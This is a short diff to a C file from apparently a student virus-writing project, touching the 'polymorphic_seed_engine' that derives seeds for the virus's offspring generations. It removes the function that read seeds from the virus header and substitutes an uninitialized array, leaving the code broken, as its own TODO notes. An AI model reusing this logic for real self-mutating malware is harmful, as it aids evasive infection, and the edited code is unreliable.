@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/12 18:29:06 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/27 02:10:16 by anselme          ###   ########.fr       */
+/*   Updated: 2020/02/22 23:31:56 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,6 +17,8 @@
 #include "log.h"
 
 /*
+** Feature went afk! TODO restore polymophism!!
+**
 ** The polymorphic_seed_engine:
 **   - assigns new seeds for the son (initializes son_seed[2])
 **   - returns a unique_seed for the son metamorphic generation
@@ -41,16 +43,9 @@
 **
 */
 
-static uint64_t	*access_virus_seeds(void)
-{
-	struct virus_header	*global_header = (void *)virus_header_struct;
-
-	return global_header->seed;
-}
-
 uint64_t	polymorphic_seed_engine(uint64_t son_seed[2], uint64_t client_id)
 {
-	uint64_t	*father_seed = access_virus_seeds();
+	uint64_t	father_seed[2]; //TODO restore polymophism
 	const uint64_t	range_length = father_seed[1] - father_seed[0];
 
 	log_old_father_seeds(father_seed);
